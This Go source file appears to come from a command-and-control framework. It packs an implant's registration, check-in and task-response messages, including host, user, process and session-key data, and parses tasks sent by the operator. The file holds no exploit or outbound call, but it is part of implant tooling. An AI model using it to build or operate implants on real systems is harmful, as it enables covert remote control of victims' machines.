package core

import (
	"bytes"
	"encoding/binary"
	"io"
	"purpcmd/implant"
	"purpcmd/internal"
)

func PackMetadata(buff *bytes.Buffer, i *implant.ImplantMetadata) {
	binary.Write(buff, binary.BigEndian, i.PID)
	binary.Write(buff, binary.BigEndian, i.SessionID)
	binary.Write(buff, binary.BigEndian, i.OTS)
	binary.Write(buff, binary.BigEndian, i.IP)
	binary.Write(buff, binary.BigEndian, i.Port)
	binary.Write(buff, binary.BigEndian, i.Sleep)
	buff.WriteByte(i.Arch)
}

func PackRegistration(i *implant.ImplantMetadata, key, iv [16]byte) []byte {
	buff := new(bytes.Buffer)
	binary.Write(buff, binary.BigEndian, internal.REG)
	PackMetadata(buff, i)

	binary.Write(buff, binary.BigEndian, key)
	binary.Write(buff, binary.BigEndian, iv)

	dataSection := bytes.Join([][]byte{
		[]byte(i.Proc),
		[]byte(i.Hostname),
		[]byte(i.User),
	}, []byte{0x00})

	binary.Write(buff, binary.BigEndian, uint16(len(dataSection)))
	buff.Write(dataSection)

	return buff.Bytes()
}

func PackCheck(i *implant.ImplantMetadata) []byte {
	buff := new(bytes.Buffer)
	binary.Write(buff, binary.BigEndian, internal.CHK)
	PackMetadata(buff, i)

	return buff.Bytes()
}

func PackResponse(i *implant.ImplantMetadata, payload []byte, TaskID [8]byte) []byte {
	buff := new(bytes.Buffer)
	binary.Write(buff, binary.BigEndian, internal.RSP)
	PackMetadata(buff, i)

	binary.Write(buff, binary.BigEndian, TaskID)
	binary.Write(buff, binary.BigEndian, uint32(len(payload)))

	responseTaskPayloadByte := make([]byte, len(payload))
	copy(responseTaskPayloadByte[:], []byte(payload))

	binary.Write(buff, binary.BigEndian, &responseTaskPayloadByte)
	return buff.Bytes()
}

func PackParseTask(buff io.Reader) ([8]byte, uint16, []byte) {
	var TaskID [8]byte
	var TaskCode uint16
	var payloadLen uint32

	binary.Read(buff, binary.BigEndian, &TaskCode)
	binary.Read(buff, binary.BigEndian, &TaskID)
	binary.Read(buff, binary.BigEndian, &payloadLen)

	payload := make([]byte, payloadLen)
	binary.Read(buff, binary.BigEndian, &payload)

	return TaskID, TaskCode, payload
}
